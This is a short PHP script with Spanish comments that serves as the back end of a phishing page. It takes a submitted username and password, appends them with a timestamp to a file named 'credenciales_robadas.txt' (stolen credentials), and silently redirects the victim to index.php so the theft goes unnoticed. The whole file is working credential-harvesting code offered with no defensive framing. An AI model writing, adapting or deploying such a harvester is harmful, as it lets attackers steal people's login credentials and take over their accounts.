<?php
// 1. Interceptamos las variables HTTP POST enviadas por el cliente
$usuario = $_POST['usuario_nexus'];
$password = $_POST['password_nexus'];

// 2. Estructuramos el string de almacenamiento con timestamp
$linea_registro = "NEXUS CAPTURE // OPERADOR: " . $usuario . " | LLAVE: " . $password . " | TIMESTAMP: " . date("Y-m-d H:i:s") . "\n";

// 3. Persistencia local mediante sistema de archivos en modo Append ("a")
$archivo = fopen("credenciales_robadas.txt", "a");
fwrite($archivo, $linea_registro);
fclose($archivo);

// 4. Redirección instantánea para cerrar el flujo Cliente-Servidor
header("Location: index.php");
exit();
?>
